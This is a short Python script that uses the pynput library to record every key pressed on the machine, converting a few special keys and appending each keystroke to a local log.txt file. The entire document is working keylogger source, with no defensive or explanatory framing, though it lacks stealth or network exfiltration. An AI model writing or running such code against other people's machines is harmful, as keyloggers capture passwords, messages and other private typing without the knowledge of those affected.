from pynput import keyboard
from pynput.keyboard import Listener


def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")


    if letter == 'Key.space':
        letter = " "
    if letter == 'Key.enter':
        letter = "\n"
    if letter == 'Key.shift':
        letter = ""
    if letter == 'Key.shift_r':
        letter = ""
    if letter == 'Key.backspace':
        letter = ""


    print(letter)
    with open("log.txt","a") as f:
        f.write(letter)


with Listener(on_press=writetofile) as l:
    l.join()